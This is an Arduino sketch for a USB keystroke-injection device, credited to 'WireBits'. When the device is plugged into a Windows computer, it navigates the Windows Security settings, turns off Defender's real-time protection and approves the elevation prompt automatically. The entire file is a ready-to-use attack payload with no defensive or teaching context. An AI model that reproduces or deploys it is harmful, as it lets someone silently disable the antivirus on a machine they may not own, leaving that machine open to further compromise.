/*
 * Disable Windows Defender
 * It turns off the Windows Defender.
 * Author - WireBits
 */

#include<Keyboard.h>
void setup()
{
 Keyboard.begin();
 delay(1000);
 Keyboard.press(KEY_LEFT_GUI);
 Keyboard.releaseAll();
 delay(1000);
 Keyboard.print("virus and threat protection");
 delay(1000);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(1000);
 for (int i=1; i<=4; i++)
 {
  delay(1100);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
 }
 delay(1000);
 Keyboard.write(32);
 delay(1000);
 Keyboard.write(32);
 delay(1000);
 Keyboard.press(KEY_LEFT_ALT);
 Keyboard.press('y');
 Keyboard.releaseAll();
 delay(1000);
 Keyboard.press(KEY_LEFT_ALT);
 Keyboard.press(KEY_F4);
 Keyboard.releaseAll();
 Keyboard.end();
}
void loop()
{
 //Nothing to do here ;)
}
